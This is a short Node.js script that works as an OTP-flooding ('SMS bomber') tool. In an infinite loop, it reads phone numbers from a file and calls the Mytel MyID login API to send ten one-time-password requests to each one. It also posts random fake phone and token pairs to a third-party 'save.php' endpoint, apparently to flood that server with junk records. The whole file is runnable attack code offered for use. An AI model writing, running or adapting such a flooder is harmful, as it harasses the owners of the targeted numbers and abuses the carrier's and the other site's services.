import axios from "axios";
import fs from "fs";

// 🔁 Load backup + block
const backup = JSON.parse(fs.readFileSync("backup.json"));
const blockList = JSON.parse(fs.readFileSync("block.json"));

// ✅ Random token
function randomToken(length = 32) {
  const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
  let token = "";
  for (let i = 0; i < length; i++) {
    token += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return token;
}

// ✅ Random 096 phone
function randomPhone() {
  return "096" + Math.floor(Math.random() * 1e8).toString().padStart(8, "0");
}

// ✅ Save token+phone to server
async function postToSave() {
  try {
    const phone = randomPhone();
    const token = randomToken();
    const res = await axios.post("https://ironcoder.site/ironmyid/save.php", {
      phone,
      token
    }, {
      headers: { "Content-Type": "application/json" }
    });
    console.log(`✅ Save success: ${phone}`);
  } catch (e) {
    console.error("❌ Save failed:", e.message);
  }
}

// ✅ Send OTP 10 times
async function sendOtp(phone) {
  for (let i = 0; i < 10; i++) {
    try {
      const url = `https://apis.mytel.com.mm/myid/authen/v1.0/login/method/otp/get-otp?phoneNumber=${phone}`;
      const res = await axios.get(url);
      if (res.status === 200) {
        console.log(`✅ (${i + 1}/10) OTP sent to ${phone}`);
      } else {
        console.log(`⚠️ (${i + 1}/10) Failed to send to ${phone} - Status: ${res.status}`);
      }
    } catch (e) {
      console.error(`❌ (${i + 1}/10) OTP error for ${phone}:`, e.message);
    }
  }
}

// ✅ Main loop
async function runAll() {
  while (true) {
    for (const entry of backup) {
      const phone = entry.phone;
      if (blockList.includes(phone)) {
        console.log(`⏭ Skipped blocked number: ${phone}`);
        continue;
      }

      // ✅ Step 1: save random user
      await postToSave();

      // ✅ Step 2: send OTP to phone 10 times
      await sendOtp(phone);
    }
    console.log("🔁 Restarting loop after processing all phones...");
  }
}

runAll();
